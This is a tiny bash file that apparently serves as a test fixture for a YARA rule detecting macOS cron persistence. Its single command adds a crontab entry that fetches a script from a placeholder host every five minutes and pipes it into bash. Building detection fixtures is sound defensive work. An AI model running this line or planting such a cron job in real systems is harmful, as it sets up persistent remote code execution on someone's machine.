#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_Cron_Persistence - text only, not a working sample.
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://example.invalid/c.sh | bash") | crontab -
